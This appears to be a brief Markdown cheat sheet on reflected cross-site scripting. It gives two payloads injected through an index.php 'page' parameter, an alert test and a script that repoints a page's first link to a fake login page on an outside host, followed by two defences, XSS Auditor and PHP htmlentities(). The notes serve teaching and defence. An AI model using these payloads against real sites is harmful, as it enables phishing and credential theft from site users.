# Cross-site scripting

## Attack

* Check

```
index.php?page=<script>alert(123)</script>
```

* Change login url

```
index.php?page=<script>document.getElementsByTagName('a')[0].href="http://hackyou.com/xss/login.html"</script>
```

## Defence
* XSS Auditor (Chrome & Safari)
* php method: htmlentities()